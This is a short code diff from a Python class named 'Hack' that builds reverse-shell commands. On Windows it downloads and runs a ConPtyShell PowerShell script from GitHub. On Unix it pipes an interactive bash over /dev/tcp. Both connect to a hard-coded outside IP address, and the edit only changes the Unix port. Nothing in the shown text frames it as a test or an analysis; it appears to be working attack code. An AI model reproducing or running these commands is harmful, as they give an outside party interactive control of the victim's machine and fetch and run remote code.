@@ -29,7 +29,7 @@ class Hack:
     def __init__(self):
         self.isWindows = platform.system() == "Windows"
         self.command = "IEX(IWR https://raw.githubusercontent.com/benax-rw/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 82.165.97.169 2002" if (
-            self.isWindows) else "/bin/bash -i >/dev/tcp/82.165.97.169/2002 0<&1 2>&1"
+            self.isWindows) else "/bin/bash -i >/dev/tcp/82.165.97.169/2003 0<&1 2>&1"
 
     def execute(self, arg):
         try:
